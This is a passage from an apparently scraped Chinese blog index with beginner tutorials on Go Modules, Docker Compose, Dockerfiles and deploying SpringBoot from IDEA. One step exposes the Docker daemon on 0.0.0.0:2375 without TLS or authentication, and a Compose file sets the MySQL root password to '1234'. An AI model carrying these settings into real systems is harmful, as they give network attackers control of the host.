终极入门、一文搞懂 Go Modules 前世今生及入门使用\nGo Modules 提供了一些命令，列举几个常用的：\ngo mod init 生成 go.mod 文件，（这个文件有点类似 Maven 的 pom） go mod download 下载 go.mod 文件中指明的所有依赖 go mod tidy 整理现有的依赖 演示一下如何更新依赖，新建一个 hello.go\npackage main import ( \u0026#34;fmt\u0026#34; // 这里引用了一个依赖 \u0026#34;rsc.io/quote\u0026#34; ) func main() { // 这里使用了引用依赖的 Hello 方法 fmt.Println(quote.Hello()) } 使用 init 命令创建 go.mod\n# 这里的 example.com/hello 是自定义的 module 名称 go mod init example.com/hello 这个时候如果运行 go build、go install、go run hello.go 都会提示依赖不存在\nhello.go:6:2: no required module provides package rsc.io/quote; to add it: go get rsc.io/quote 我们可以按照提示使用 go get rsc.io/quote，用 go get 来获取某个具体的依赖 如果有很多依赖的话，go get 就比较麻烦，可以使用 go mod tidy，它会自动添加丢失的依赖、删除不需要的依赖\n在 go mod tidy 后，我们可以运行 go run hello.go，这个时候程序就可以正常运行了\n入门 推荐官方的交互式教程 A Tour of Go，网页就可以敲 Go代码，也有中文版本：Go 指南，这个教程可以让你快速上手，想要更细致地学习 Go，推荐 Go语言圣经（中文版）\n引用 Go语言圣经 - 入门 中的一句话：\n学习一门新语言时，会有一种自然的倾向，按照自己熟悉的语言的套路写新语言程序。学习Go语言的过程中，请警惕这种想法，尽量别这么做\n我们在解决一个问题的时候很容易思维定势，用已经会的语言的思维思考，推荐视频教程 神奇代码在哪里Go实战，可以看看其他人在写 Go 的时候是如何思考的\n","permalink":"https://aaronlinv.github.io/posts/%E7%AE%80%E5%8D%95%E7%9A%84-go-%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/","summary":"\u003cp\u003eGo（又称 Golang ）是 Google 开发的一种静态强类型、编译型、并发型，并具有垃圾回收功能的编程语言\u003c/p\u003e\n\u003cp\u003eDocker 和 Kubernetes 都是使用 Go 进行开发的，这几年 Go 越来越流行，生态也越来越好了\u003c/p\u003e\n\u003cp\u003e初学 Go 的时候会遇到了一些小问题，在一些教程中没有提及或者因为时效性的缘故，经常需要查阅很多资料才能弄懂，所以想写一篇比较新人视角的文章帮助大家入门\u003c/p\u003e\n\u003ch2 id=\"安装\"\u003e安装\u003c/h2\u003e\n\u003cp\u003eGo 的官网就是 \u003ca href=\"https://golang.org/\"\u003egolang.org\u003c/a\u003e，点击首页的 \u003ca href=\"https://golang.org/dl/\"\u003eDownload Go\u003c/a\u003e 就可以跳转到下载页面，然后下载对应操作系统的 Go，如果国内访问缓慢，可以访问镜像站：\u003ca href=\"https://golang.google.cn/\"\u003egolang.google.cn\u003c/a\u003e，官方安装教程：\u003ca href=\"https://golang.org/doc/install\"\u003eDownload and install\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eWindows 只要下载对应的 msi 文件，然后打开后按照提示基本上就是下一步下一步\u0026hellip; 具体可以参考这篇博客：\u003ca href=\"https://www.cnblogs.com/Can-daydayup/p/15177665.html\"\u003eWindows Go 开发环境下载、安装并配置\u003c/a\u003e，安装完成后 Windows 需要 Win键 + R键，然后输入 \u003ccode\u003ecmd\u003c/code\u003e，输入 \u003ccode\u003ego version\u003c/code\u003e，显示版本号就说明安装完成\u003c/p\u003e\n\u003ch2 id=\"goproxy\"\u003eGOPROXY\u003c/h2\u003e\n\u003cp\u003e国内下载依赖库会比较缓慢，所有我们需要配置 Go Proxy 加速依赖下载（有点像 Java 中修改 Maven 镜像仓库），这里镜像源使用 \u003ca href=\"https://goproxy.cn\"\u003e七牛云\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ego env -w \u003cspan class=\"nv\"\u003eGOPROXY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttps://goproxy.cn,direct\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e也可以通过 \u003ccode\u003ego env\u003c/code\u003e 查看所有的 Go 环境变量，其中就包括 GOPROXY，这个变量定义的就是配置 Go 镜像\u003c/p\u003e\n\u003ch2 id=\"hello-world\"\u003eHello World\u003c/h2\u003e\n\u003cp\u003e推荐使用 JetBrains 家的 \u003ca href=\"https://www.jetbrains.com/go/\"\u003eGoLand\u003c/a\u003e，使用体验基本和 JetBrains 家的其他软件例如：IDEA、PyCharm 相似，还有一种也比较主流，就是使用 VSCode 配合 Go 插件，可以参考：\u003ca href=\"https://zhuanlan.zhihu.com/p/320343679\"\u003eVsCode Go插件配置最佳实践指南\u003c/a\u003e，相对来说需要比较多的配置，而且调试比较麻烦，对于新手不是很友好\u003c/p\u003e","title":"简单的 Go 入门教程"},{"content":"上一节：IDEA 配合 Dockerfile 部署 SpringBoot 工程\nDocker Compose 可以实现 Docker 容器集群的编排，可以通过 docker-compose.yml 文件，定义我们的服务及其需要的依赖，轻松地运行在测试、生产等环境\n文档 Product manuals\nCompose file version 3 reference\nDocker 从入门到实践 【中文】\n安装 Compose Compose 依赖 Docker Engine，所有要保证环境安装了 Docker，可参考官方教程，主要分为两步：\n# 1. 下载 Compose 只执行文件到 usr/local/bin/ 目录 # 下载失败可以参考下一小结提供地址安装 sudo curl -L \u0026#34;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\u0026#34; -o /usr/local/bin/docker-compose # 2. 对 Compose 可执行文件添加运行权限 sudo chmod +x /usr/local/bin/docker-compose # 输入下面命令查看帮助，测试安装是否成功 docker-compose -h Compose 开源在 Docker 官方的 GitHub 仓库：docker/compose，所有的 Compose 都会发布在仓库的 Releases 里，步骤1就是使用 curl 命令从 Releases 里下载可执行文件，uname -s和uname -m 可以读取系统的内核名称和硬件架构，用来匹配需要的 Compose 版本， curl 的 -L 参数会让 HTTP 请求跟随重定向（默认不跟随），-o (小写o) 会将服务器响应保存成文件，直接下载到：usr/local/bin/ 下，文件名为：docker-compose，因为这个路径已经在环境变量中了，所以完成步骤2，添加可执行权限后，就可以在任意位置使用了\n直接从 GitHub 下载比较慢可以通过以下地址下载：\n# https://vuepress.mirror.docker-practice.com/compose/install/ sudo curl -L https://download.fastgit.org/docker/compose/releases/download/1.27.4/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose 入门 Compose 的模版指令与 Docker 的 run 命令相关参数很相似，忘记了 docker 命令可以参考之前的一篇博客：Docker 实践及命令梳理\nCompose 中有两个重要的概念：\n服务 (service)：一个应用的容器，实际上可以包括若干运行相同镜像的容器实例\n项目 (project)：由一组关联的应用容器组成的一个完整业务单元，在 docker-compose.yml 文件中定义\ndocker-compose.yml 格式如下，注意：YAML 文件必须要键值之间的 : 后面必须有一个空格，缩进表示层级，要注意缩进 有使用到的 volumes 和 networks 必须声明\n# 指定版本 version: \u0026#34;3\u0026#34; # 服务的集合 services: # 其中一个服务，服务名为：webapp webapp: # 指定该服务使用的镜像 image: examples/web # 端口映射 ports: - \u0026#34;80:80\u0026#34; # 数据卷 volumes: - \u0026#34;/data\u0026#34; 简单上手 在一个 Compose 中启动 Tomcat, MySQL, redis，创建 docker-compose.yml\nversion: \u0026#34;3.0\u0026#34; services: tomcat: container_name: mytomcat # --name image: tomcat:8.0-jre8 ports: - \u0026#34;8080:8080\u0026#34; volumes: - \u0026#34;tomcatwebapps:/usr/local/tomcat/webapps\u0026#34; networks: - some_network # tomcat 服务依赖于 mysql 和 redis depends_on: - mysql - redis mysql: container_name: mysql image: mysql:5.7.32 ports: - \u0026#34;3306:3306\u0026#34; volumes: - \u0026#34;mysqldata:/var/lib/mysql\u0026#34; - \u0026#34;mysqlconf:/etc/mysql\u0026#34; environment: - MYSQL_ROOT_PASSWORD=1234 networks: some_network: redis: container_name: redis image: redis:5.0.10 ports: - \u0026#34;6379:6379\u0026#34; volumes: - \u0026#34;redisdata:/data\u0026#34; command: \u0026#34;redis-server --appendonly yes\u0026#34; networks: some_network: # 使用到的 volumes 和 networks 必须声明 volumes: tomcatwebapps: mysqldata: mysqlconf: redisdata: networks: # 声明名称为 “some_network” 的网络 some_network: 在 docker-compose.yml 所在路径执行 docker-compose up 启动 Compose 项目，它会下载使用到的镜像并在前台运行打印日志，可以使用 Ctrl + C 终止\n如果需要后台运行执行 docker-compose up -d，这时候使用 docker ps 可以看到 Compose 已经根据 yaml 创建了相关的容器，使用 docker-compose down 停止 Compse 并移除自动创建的网桥\n使用 docker network ls 查看网络或者 docker volume ls 查看数据卷，Compose 定义的网络或数据卷名称格式为：docker-compose.yml所在文件夹的名称加上下划线再加上 yaml 中定义名称，如果在 \u0026ldquo;dockerfile\u0026rdquo; 文件夹下创建 yaml 文件并启动，那么网络名称为：dockerfile_some_network\ntomcat 服务使用了 depends_on，表示它依赖于 redis 和 mysql 服务，Compose 将优先启动它的依赖再启动它\n命令梳理 Docker Compose 的命令与 Dokcer 类似，可以使用 \u0026ndash;help 参数，就可以查询到到对应命令的使用方法\ndocker-compose --help 默认启动的模版文件名为 docker-compose.yml，可以使用 -f 指定自定义的模版文件 可以通过 config 命令，检查模版文件语法是否正确\ndocker-compse 也包含很多子命令： 启动停止相关：up, down, restart, stop, pasue, unpause\n资源相关：ps, top, kill, run\n进入容器：exec\n查看日志：logs\n很多子命令都可以在后面跟上某个具体的 service 名称，定向地操作，下面不一一举例， 可以使用docker-compose help 再跟上子命令名称，查询其用法\n# 后台启动 yaml 定义的所有容器 docker-compose up -d # 仅启动 mysql 这个service，会启动其依赖的 service docker-compose up mysql 指定启动的server名称， # 停止容器并移除自动创建的网桥 docker-compose down # 重启所有 service 后面可以指定上某个具体的 service docker-compose restart # 暂停 和 恢复 docker-compose pause docker-compose unpause # 进入 redis 这个 service 使用 exit 退出 docker-compose exec redis bash # 列出当前 yaml 中定义的容器的信息 docker-compose ps # 删除当前 yaml 中定义的容器，需要先 stop，后面可以指定上某个具体的 service docker-compose rm # 查看各个 service 容器内运行的进程情况 docker-compose top # 查看日志默认查看 yaml 所有的，可以跟上具体 service # -f 可以保持跟踪，新的日志会马上显示在屏幕上 docker-compose logs 参考资料 curl 的用法指南 【编程不良人】Docker容器技术\u0026amp;Docker-Compose实战\n上一节：IDEA 配合 Dockerfile 部署 SpringBoot 工程\n","permalink":"https://aaronlinv.github.io/posts/docker-compose-%E5%AE%9E%E8%B7%B5%E5%8F%8A%E6%A2%B3%E7%90%86/","summary":"\u003cp\u003e上一节：\u003ca href=\"https://www.cnblogs.com/aaronlinv/p/15228488.html\"\u003eIDEA 配合 Dockerfile 部署 SpringBoot 工程\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003eDocker Compose 可以实现 Docker 容器集群的编排，可以通过 \u003ccode\u003edocker-compose.yml\u003c/code\u003e 文件，定义我们的服务及其需要的依赖，轻松地运行在测试、生产等环境\u003c/p\u003e\n\u003ch2 id=\"文档\"\u003e文档\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://docs.docker.com/compose/\"\u003eProduct manuals\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://docs.docker.com/compose/compose-file/compose-file-v3/\"\u003eCompose file version 3 reference\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://vuepress.mirror.docker-practice.com/compose/introduction/\"\u003eDocker 从入门到实践 【中文】\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"安装-compose\"\u003e安装 Compose\u003c/h2\u003e\n\u003cp\u003eCompose 依赖 Docker Engine，所有要保证环境安装了 Docker，可参考\u003ca href=\"https://docs.docker.com/compose/install/\"\u003e官方教程\u003c/a\u003e，主要分为两步：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 1. 下载 Compose 只执行文件到 usr/local/bin/ 目录\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 下载失败可以参考下一小结提供地址安装\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo curl -L \u003cspan class=\"s2\"\u003e\u0026#34;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003euname -s\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e-\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003euname -m\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e -o /usr/local/bin/docker-compose\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 2. 对 Compose 可执行文件添加运行权限\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo chmod +x /usr/local/bin/docker-compose\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 输入下面命令查看帮助，测试安装是否成功\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker-compose -h\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eCompose 开源在 Docker 官方的 GitHub 仓库：\u003ca href=\"https://github.com/docker/compose\"\u003edocker/compose\u003c/a\u003e，所有的 Compose 都会发布在仓库的 \u003ca href=\"https://github.com/docker/compose/releases\"\u003eReleases\u003c/a\u003e 里，步骤1就是使用 curl 命令从 Releases 里下载可执行文件，\u003ccode\u003euname -s\u003c/code\u003e和\u003ccode\u003euname -m\u003c/code\u003e 可以读取系统的内核名称和硬件架构，用来匹配需要的 Compose 版本， \u003ccode\u003ecurl\u003c/code\u003e 的 -L 参数会让 HTTP 请求跟随重定向（默认不跟随），-o (小写o) 会将服务器响应保存成文件，直接下载到：usr/local/bin/ 下，文件名为：docker-compose，因为这个路径已经在环境变量中了，所以完成步骤2，添加可执行权限后，就可以在任意位置使用了\u003c/p\u003e","title":"Docker Compose 实践及梳理"},{"content":"上一节：Dockerfile 实践及梳理 下一节：Docker Compose 实践及梳理\n准备 SpringBoot 工程 新建 SpringBoot 项目，默认的端口是 8080 ，新建 Controller 和 Mapping @RestController public class HelloController { @GetMapping(\u0026#34;hello\u0026#34;) public String hello() { return \u0026#34;hello world!\u0026#34;; } } 注意，需要在 pom 中添加 spring-boot-maven-plugin 插件，否则运行 jar 包时会提示：没有主清单属性\n\u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; 启动项目，访问 http://localhost:8080/hello 测试\n在项目目录添加 Dockerfile 文件 FROM openjdk:8-jre # ./target/demo-0.0.1-SNAPSHOT.jar 为编译后的 jar 包位置 # jar 包的名称要与自己配置的相同，格式为：项目名称-版本号.jar COPY ./target/demo-0.0.1-SNAPSHOT.jar app.jar EXPOSE 8080 ENTRYPOINT [\u0026#34;java\u0026#34;,\u0026#34;-jar\u0026#34;] CMD [\u0026#34;app.jar\u0026#34;] Docker 远程连接配置 演示使用的 Docker 宿主机是 CentOS 7，修改配置并重启 Docker 服务 vim /lib/systemd/system/docker.service 将 ExecStar 这行配置修改为下面这行\nExecStart=/usr/bin/dockerd -H unix:///var/run/docker.sock -H tcp://0.0.0.0:2375 重启服务\nsystemctl daemon-reload systemctl restart docker 可以通过访问 API 进行测试，IP 需要修改为宿主机对应的 IP，端口设置的为 2375，访问成功会显示 Docker Engine 的相关版本信息\nhttp://192.168.43.161:2375/version\n如果是部署在公网或者生产环境，需要配置安全访问，可以参考：Docker开启远程安全访问\nIDEA 配置 IDEA 安装 Docker 插件 配置 IDEA Docker 连接 在设置中可以找到 Docker，点击加号可以添加新的 Docker 连接，输入名称、Engine API URL，然后就会提示：Connection successful，即连接成功 点击 Run/Debug Configurations 输入名称、添加 Dockerfile（刚刚添加的那个）、容器名称、映射端口号 Before launch选择Maven 并输入命令：clean package -U -DskipTests，这个命令在每次编译 Dockerfile 之前都会运行 点击运行就会自动打 jar 包，并在宿主机上构建镜像，运行容器 可以通过 Docker 宿主机进行测试访问，这里演示使用的 192.168.43.161 需要替换成自己 Docker 宿主机的 IP\nhttp://192.168.43.161:8080/hello\n参考资料 Docker - 远程连接 IDEA的Docker插件实战(Dockerfile篇)\n上一节：Dockerfile 实践及梳理 下一节：Docker Compose 实践及梳理\n","permalink":"https://aaronlinv.github.io/posts/idea-%E9%85%8D%E5%90%88-dockerfile-%E9%83%A8%E7%BD%B2-springboot-%E5%B7%A5%E7%A8%8B/","summary":"\u003cp\u003e上一节：\u003ca href=\"https://www.cnblogs.com/aaronlinv/p/15213211.html\"\u003eDockerfile 实践及梳理\u003c/a\u003e\n下一节：\u003ca href=\"https://www.cnblogs.com/aaronlinv/p/15270704.html\"\u003eDocker Compose 实践及梳理\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"准备-springboot-工程\"\u003e准备 SpringBoot 工程\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e新建 SpringBoot 项目，默认的端口是 8080 ，新建 Controller 和 Mapping\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nd\"\u003e@RestController\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"kd\"\u003epublic\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kd\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eHelloController\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nd\"\u003e@GetMapping\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;hello\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"kd\"\u003epublic\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eString\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nf\"\u003ehello\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;hello world!\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意，需要在 pom 中添加 spring-boot-maven-plugin 插件，否则运行 jar 包时会提示：没有主清单属性\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;build\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nt\"\u003e\u0026lt;plugins\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nt\"\u003e\u0026lt;plugin\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nt\"\u003e\u0026lt;groupId\u0026gt;\u003c/span\u003eorg.springframework.boot\u003cspan class=\"nt\"\u003e\u0026lt;/groupId\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nt\"\u003e\u0026lt;artifactId\u0026gt;\u003c/span\u003espring-boot-maven-plugin\u003cspan class=\"nt\"\u003e\u0026lt;/artifactId\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nt\"\u003e\u0026lt;/plugin\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nt\"\u003e\u0026lt;/plugins\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;/build\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e启动项目，访问 http://localhost:8080/hello 测试\u003c/p\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e在项目目录添加 Dockerfile 文件\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-dockerfile\" data-lang=\"dockerfile\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eFROM\u003c/span\u003e\u003cspan class=\"s\"\u003e openjdk:8-jre\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"c\"\u003e#  ./target/demo-0.0.1-SNAPSHOT.jar 为编译后的 jar 包位置\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"c\"\u003e# jar 包的名称要与自己配置的相同，格式为：项目名称-版本号.jar\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eCOPY\u003c/span\u003e ./target/demo-0.0.1-SNAPSHOT.jar app.jar\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eEXPOSE\u003c/span\u003e\u003cspan class=\"s\"\u003e 8080\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eENTRYPOINT\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;java\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;-jar\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eCMD\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;app.jar\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"err\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003col start=\"3\"\u003e\n\u003cli\u003eDocker 远程连接配置\n演示使用的 Docker 宿主机是 CentOS 7，修改配置并重启 Docker 服务\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evim /lib/systemd/system/docker.service\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e将 \u003ccode\u003eExecStar\u003c/code\u003e 这行配置修改为下面这行\u003c/p\u003e","title":"IDEA 配合 Dockerfile 部署 SpringBoot 工程"},{"content":"上一节：Docker 实践及命令梳理 下一节：IDEA 配合 Dockerfile 部署 SpringBoot 工程\nDockerfile 是一个文本文件，我们可以通过组合一条条的指令 (Instruction)，来构建满足我们需求的 Docker 镜像\n文档 Best practices for writing Dockerfiles\nReference\nDockerfile 指令详解\n简单上手 使用 Dockerfile 构建SpringBoot 工程的镜像\n新建 SpringBoot 项目，默认的端口是 8080 ，新建 Controller 和 Mapping @RestController public class HelloController { @GetMapping(\u0026#34;hello\u0026#34;) public String hello() { return \u0026#34;hello world!\u0026#34;; } } 启动项目，访问 http://localhost:8080/hello 测试\n打 jar 包 注意，需要在 pom 中添加 spring-boot-maven-plugin 插件，否则运行 jar 包时会提示：没有主清单属性 \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; #打包 mvn package target 目录下就可以找到 .jar 文件，我这里的文件名为：demo-0.0.1-SNAPSHOT.jar 在 Linux 新建 ~/springboot 文件夹，并将 jar 包上传到这个文件夹下\n新建 Dockerfile 在这个文件下新建 Dockerfile 文件 # 基于 openjdk:8-jre 这个基础镜像进行构建 FROM openjdk:8-jre # 这里的 demo-0.0.1- SNAPSHOT.jar 要对应上传的 jar 包名称 # 将 本地 jar包 复制到容器内 COPY demo-0.0.1-SNAPSHOT.jar app.jar # 开放 8080 端口 EXPOSE 8080 # 运行命令、参数 ENTRYPOINT [\u0026#34;java\u0026#34;,\u0026#34;-jar\u0026#34;] CMD [\u0026#34;app.jar\u0026#34;] 保存文件，退出编辑器\n编译 Docker 镜像 # build 是构建 Docker 镜像的命令 # -t 指定镜像的 tag # 名称：demo 版本：v1.0 # 最后的 . 表示 build context 目录为当前目录，目的是为了找到 所需的 jar 包 docker 